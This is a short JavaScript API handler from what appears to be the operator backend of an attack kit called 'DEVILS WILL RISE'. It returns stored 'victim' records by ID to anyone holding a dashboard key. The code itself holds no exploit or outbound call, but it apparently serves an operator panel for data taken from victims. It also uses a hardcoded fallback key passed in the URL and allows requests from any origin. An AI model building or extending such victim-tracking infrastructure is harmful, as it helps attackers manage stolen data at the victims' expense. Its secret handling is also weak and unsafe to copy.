/* ============================================================
   DEVILS WILL RISE — Single Victim API
   GET /api/victim?id=V-XXXXXX&key=tneh2024
   ============================================================ */

const DASHBOARD_KEY = process.env.DASHBOARD_KEY || 'tneh2024';

export default function handler(req, res){
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if(req.method === 'OPTIONS'){
    return res.status(200).end();
  }

  const key = req.query.key || '';
  if(key !== DASHBOARD_KEY){
    return res.status(401).json({ ok:false, error:'Unauthorized' });
  }

  const id = req.query.id;
  if(!id){
    return res.status(400).json({ ok:false, error:'Missing id' });
  }

  const store = globalThis.__DWR_VICTIMS__ || new Map();
  const victim = store.get(id);

  if(!victim){
    return res.status(404).json({ ok:false, error:'Victim not found' });
  }

  return res.status(200).json({ ok:true, victim });
}
